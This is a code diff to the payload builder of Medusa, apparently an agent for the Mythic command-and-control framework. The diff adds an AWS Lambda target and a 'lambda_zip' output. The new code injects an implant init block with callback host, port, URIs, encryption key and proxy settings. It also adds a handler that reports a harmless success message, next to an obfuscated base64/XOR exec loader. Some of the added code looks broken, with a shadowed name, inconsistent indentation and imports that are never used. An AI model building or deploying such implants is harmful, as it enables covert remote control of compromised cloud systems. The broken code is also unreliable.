@@ -2,7 +2,7 @@ from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 
-import asyncio, pathlib, os, tempfile, base64, hashlib, json
+import asyncio, pathlib, os, tempfile, base64, hashlib, json, io, zipfile
 
 from itertools import cycle
 
@@ -12,7 +12,7 @@ class Medusa(PayloadType):
     file_extension = "py"
     author = "@ajpc500"
     supported_os = [  
-        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
+        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS, SupportedOS("AWS Lambda"),
     ]
     wrapper = False  
     wrapped_payloads = ["pickle_wrapper"]  
@@ -24,7 +24,7 @@ class Medusa(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose output format",
-            choices=["py", "base64"],
+            choices=["py", "base64", "lambda_zip"],
             default_value="py"
         ),
         BuildParameter(
@@ -86,6 +86,14 @@ class Medusa(PayloadType):
             return filename         
 
     async def build(self) -> BuildResponse:
+        lambda_handler = """
+def lambda_handler(event, context):
+    medusa = medusa()
+    return {
+        'statusCode': 200,
+        'body': 'Medusa agent executed successfully'
+    }
+    """
         # this function gets called to create an instance of your payload
         resp = BuildResponse(status=BuildStatus.Success)
         # create the payload
@@ -174,6 +182,55 @@ exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encod
             if self.get_parameter("output") == "base64":
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully Built"
+            elif self.get_parameter("output") == "lambda_zip":
+                # Find the start of __init__ function and truncate
+                init_start = base_code.find("def __init__(self):")
+                base_code = base_code[:init_start]
+                
+                # Add our Lambda implementation
+                base_code += """    self.socks_open = {}
+                    self.socks_in = queue.Queue()
+                    self.socks_out = queue.Queue()
+                    self.taskings = []
+                    self._meta_cache = {}
+                    self.moduleRepo = {}
+                    self.current_directory = '/tmp'
+                    self.agent_config = {
+                        "Server": "callback_host",
+                        "Port": "callback_port",
+                        "PostURI": "/post_uri",
+                        "PayloadUUID": "UUID_HERE",
+                        "UUID": "UUID_HERE",
+                        "Headers": headers,
+                        "Sleep": callback_interval,
+                        "Jitter": callback_jitter,
+                        "KillDate": "killdate",
+                        "enc_key": AESPSK,
+                        "ExchChk": "encrypted_exchange_check",
+                        "GetURI": "/get_uri",
+                        "GetParam": "query_path_name",
+                        "ProxyHost": "proxy_host",
+                        "ProxyUser": "proxy_user",
+                        "ProxyPass": "proxy_pass",
+                        "ProxyPort": "proxy_port",
+                    }
+                    
+                    if not self.passedKilldate():
+                        try:
+                            self.getTaskings()
+                            self.processTaskings()
+                            self.postResponses()
+                        except:
+                            pass
+
+            def lambda_handler(event, context):
+                medusa = medusa()
+                return {
+                    'statusCode': 200,
+                    'body': json.dumps('Medusa agent executed successfully')
+                }
+            """
+
             else:
                 resp.payload = base_code.encode()
                 resp.build_message = "Successfully built!"
